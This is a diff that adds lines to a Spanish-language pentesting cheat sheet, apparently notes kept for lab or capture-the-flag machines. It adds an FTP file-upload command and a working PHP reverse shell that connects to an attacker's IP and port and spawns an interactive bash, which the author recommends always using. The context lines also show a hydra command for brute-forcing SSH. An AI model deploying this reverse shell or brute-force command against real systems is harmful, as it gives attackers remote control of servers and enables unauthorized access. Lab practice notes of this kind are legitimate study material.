@@ -257,6 +257,29 @@ hydra -L worlist.txt -P wordlist IP ssh
 
 Esta es una maquina buena para practicar cosas basicas que se necesitan.
 
+#### FTP 
+
+Para subir archivos en caso de que tengamos permiso de escritura en dicho servidor se utiliza:
+
+```
+put archivo.txt
+```
+
+### PHP reverse shell
+
+Esta es una shell reversa mas optimizada y facil de usar yo creo deberia usar siempre esta se pude cambiar por sh
+
+```
+<?php
+$ip = '10.0.0.1'; // Dirección IP del atacante
+$port = 1234; // Puerto en el que el atacante está escuchando
+
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+
+?>
+```
+
 ### Pasar archivos con /dev/tcp/IP/port ( Y otras opciones)
 
 #### cat
